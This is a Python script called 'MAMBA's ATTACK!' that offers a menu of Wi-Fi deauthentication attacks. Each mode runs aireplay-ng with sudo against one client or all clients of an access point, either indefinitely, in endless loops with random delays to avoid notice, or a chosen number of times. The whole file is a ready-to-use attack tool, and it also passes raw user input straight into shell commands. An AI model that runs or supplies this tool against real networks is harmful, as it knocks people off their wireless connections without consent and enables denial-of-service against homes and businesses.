import os 
import sys
import time
import random

Menu="""

MAMBA's ATTACK! 

                                                                                                                     
@@@@@@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@    @@@@@@       @@@@@@   @@@@@@@  @@@@@@@   @@@@@@    @@@@@@@  @@@  @@@  
@@@@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
@@! @@! @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@@     @@!  @@@    @@!      @@!    @@!  @@@  !@@       @@!  !@@  
!@! !@! !@!  !@!  @!@  !@! !@! !@!  !@   @!@  !@!  @!@     !@!  @!@    !@!      !@!    !@!  @!@  !@!       !@!  @!!  
@!! !!@ @!@  @!@!@!@!  @!! !!@ @!@  @!@!@!@   @!@!@!@!     @!@!@!@!    @!!      @!!    @!@!@!@!  !@!       @!@@!@!   
!@!   ! !@!  !!!@!!!!  !@!   ! !@!  !!!@!!!!  !!!@!!!!     !!!@!!!!    !!!      !!!    !!!@!!!!  !!!       !!@!!!    
!!:     !!:  !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!!     !!:  !!!    !!:      !!:    !!:  !!!  :!!       !!: :!!   
:!:     :!:  :!:  !:!  :!:     :!:  :!:  !:!  :!:  !:!     :!:  !:!    :!:      :!:    :!:  !:!  :!:       :!:  !:!  
:::     ::   ::   :::  :::     ::    :: ::::  ::   :::     ::   :::     ::       ::    ::   :::   ::: :::   ::  :::  
 :      :     :   : :   :      :    :: : ::    :   : :      :   : :     :        :      :   : :   :: :: :   :   :::  

 from ascii.co.uk
______________________________

WATCH OUT! THE MAMBA IS COMMING! 


0-Deauth attack against 1 client - Infinite Attacks.
1-Deauth attack against 1 client - Infinite loop. 100 attacks loop with random timer. Infinite loop
2-Deauth attack against 1 client - Specified number of attacks.
3-Deauth attack against all clients in a AP - Infinite Attack
4-Deauth attack against all clients in a AP - Infinite loop. 100 attacks loop with random timer.
5-Deauth attack against all clients in a AP - Specified number of attacks.
6-Deauth attack against a client with unknown ESSID - Infinite Attack
7-Exit

"""
print("\n")

print(Menu)

print("\n")

continuity=True

while continuity:

    selection = input("Select an option: ")

    if selection=="0":

        bssid=input("Select AP: ")
        client=input("Select client: ")
        essid=input("Select SSID: ")
        interface=input("Monitor interface: ")

        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {client} -e {essid} {interface}")


    elif selection=="1":

        bssid=input("Select AP: ")
        client=input("Select client: ")
        essid=input("Select SSID: ")
        interface=input("Monitor interface: ")

        while True:

            num=random.randint(1,20)
            interval=5
            reaction_at=interval*num

            delay=time.sleep(reaction_at)

            os.system(f"sudo aireplay-ng -0 100 -a {bssid} -c {client} -e {essid} {interface}")
    
    elif selection =="2":

        bssid=input("Select AP: ")
        client=input("Select client: ")
        essid=input("Select SSID: ")
        interface=input("Monitor interface: ")
        n_times=input("Number of mamba's attacks: ")

        num=random.randint(1,30)
        interval=5
        reaction_at=interval*num

        os.system(f"sudo aireplay-ng -0 {n_times} -a {bssid} -c {client} -e {essid} {interface}")


    if selection=="3":

        bssid=input("Select AP: ")
        essid=input("Select SSID: ")
        interface=input("Monitor interface: ")

        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -e {essid} {interface}")


    elif selection=="4":

        bssid=input("Select AP: ")
        essid=input("Select SSID: ")
        interface=input("Monitor interface: ")

        num=random.randint(1,20)
        interval=5
        reaction_at=interval*num


        while True:

            num=random.randint(1,20)
            interval=5
            reaction_at=interval*num

            delay=time.sleep(reaction_at)

            os.system(f"sudo aireplay-ng -0 100 -a {bssid} -e {essid} {interface}")
        
        
    
    elif selection =="5":

        bssid=input("Select AP: ")
        essid=input("Select SSID: ")
        interface=input("Monitor interface: ")
        n_times=input("Number of mamba's attacks: ")
        os.system(f"sudo aireplay-ng -0 {n_times} -a {bssid} -e {essid} {interface}")


    elif selection =="6":

        bssid=input("Select AP: ")
        client=input("Select client: ")
        interface=input("Monitor interface: ")
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {interface}")


    else:
        print("Bye Bye!")
        break
